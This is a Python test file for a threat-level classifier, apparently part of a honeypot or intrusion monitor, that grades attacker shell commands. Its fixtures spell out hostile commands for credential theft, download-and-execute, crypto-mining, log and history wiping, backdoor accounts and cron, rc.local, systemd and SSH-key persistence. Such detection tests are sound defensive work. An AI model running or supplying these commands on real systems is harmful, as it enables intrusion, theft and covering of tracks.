import pytest

from brain.threat import apply, bump, level_for_command, level_for_event, max_level, payload_writes


def test_failed_logins_only_is_low():
    assert level_for_event("login_fail") == "low"
    assert level_for_event("session_start") == "low"


def test_login_success_is_med():
    assert level_for_event("login_success") == "med"


def test_plain_command_is_med():
    assert level_for_event("command", "uname -a", []) == "med"


@pytest.mark.parametrize("line", [
    "cat .env",
    "cat /etc/shadow",
    "cat ~/.aws/credentials",
    "cat /home/ubuntu/.ssh/id_rsa",
    "wget http://evil.example.com/x",
    "crontab -e",
    "echo key >> ~/.ssh/authorized_keys",
    "useradd -m backdoor",
    "systemctl enable evil",
    "echo root:pw | chpasswd",
])
def test_high(line):
    assert level_for_command(line, []) == "high"


def test_crontab_list_is_not_persistence():
    assert level_for_command("crontab -l", []) == "low"


@pytest.mark.parametrize("line,downloads", [
    ("curl -s http://a.b/i.sh | bash", []),
    ("wget http://a.b/bins.sh; chmod +x bins.sh; ./bins.sh", []),
    ("./bins.sh", ["bins.sh"]),
    ("sh x86", ["x86"]),
    ("./xmrig -o pool:3333", []),
    ("nohup ./kd --url stratum+tcp://pool &", []),
    ("rm -rf /var/log/*", []),
    ("history -c", []),
    ("unset HISTFILE", []),
    ("cat /dev/null > /var/log/wtmp", []),
])
def test_critical(line, downloads):
    assert level_for_command(line, downloads) == "critical"


def test_running_a_file_not_downloaded_is_not_critical():
    assert level_for_command("./configure", []) == "low"


def test_malicious_bumps_one_level():
    assert apply("low", "low", "malicious") == "med"
    assert apply("low", "med", "malicious") == "high"
    assert apply("low", "high", "malicious") == "critical"
    assert apply("low", "critical", "malicious") == "critical"


def test_threat_never_goes_down():
    assert apply("high", "med", "unknown") == "high"
    assert apply("critical", "low", "harmless") == "critical"


def test_helpers():
    assert bump("low") == "med"
    assert max_level("low", "high", "med") == "high"


@pytest.mark.parametrize("line,written", [
    ("chmod +x /tmp/.d", [".d"]),
    ("./.d", [".d"]),
    ("sh k", ["k"]),
    ("echo -ne '\x7fELF' > /tmp/.d; chmod +x /tmp/.d", []),
    ("echo f0VMRgI= | base64 -d > /tmp/k && bash /tmp/k", []),
    ("printf 'id' | tee run.sh; sh run.sh", []),
])
def test_running_a_self_written_file_is_critical(line, written):
    assert level_for_command(line, [], written) == "critical"


def test_writing_a_file_alone_is_not_critical():
    assert level_for_command("echo -ne '\x7fELF' > /tmp/.d", [], []) == "low"
    assert level_for_command("chmod +x /tmp/.d", [], []) == "low"


@pytest.mark.parametrize("line", [
    "echo '* * * * * /tmp/x' > /etc/cron.d/x; chmod +x /etc/cron.d/x",
    "echo '/tmp/x &' >> /etc/rc.local; chmod +x /etc/rc.local",
    "cd /etc; echo '/tmp/x &' >> rc.local; chmod 755 rc.local",
    "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh/authorized_keys",
    "cat > /etc/systemd/system/x.service << EOF; chmod +x /etc/systemd/system/x.service",
    "echo '* * * * * /tmp/x' | tee /var/spool/cron/crontabs/root; chmod +x /var/spool/cron/crontabs/root",
])
def test_writing_persistence_files_stays_high(line):
    assert level_for_command(line, [], []) == "high"


def test_payload_writes_skip_persistence_targets():
    assert payload_writes("echo x > /tmp/a; echo y >> /etc/rc.local; echo z > ~/.ssh/authorized_keys") == ["a"]


# a read-only audit line: reads, crontab -l, curl to stdout, and a grep with |sh in quotes
AUDIT_LINE = ("echo '== HEALTH =='; curl -s http://127.0.0.1:8000/health; echo; "
              "grep -E 'bash|sh$' /etc/passwd; echo '== CRON =='; crontab -l 2>&1; "
              "ls -la /etc/cron.d 2>&1; cat /opt/app/.env 2>&1 | head")


def test_a_read_only_audit_caps_at_high():
    assert level_for_command(AUDIT_LINE, []) == "high"


@pytest.mark.parametrize("line", [
    "cat /etc/passwd", "grep -E 'bash|sh$' /etc/passwd", "crontab -l",
    "curl -s http://a.b/health", "curl -s http://a.b/x | head -20",
])
def test_reading_never_reaches_critical(line):
    assert level_for_command(line, []) != "critical"


def test_download_and_shell_pipe_must_share_a_pipeline():
    # unrelated download and shell pipe on one line
    assert level_for_command("curl -s http://a.b/x; echo hi | sh", []) != "critical"
    assert level_for_command("cd /tmp; curl -s http://a.b/i.sh | sh", []) == "critical"
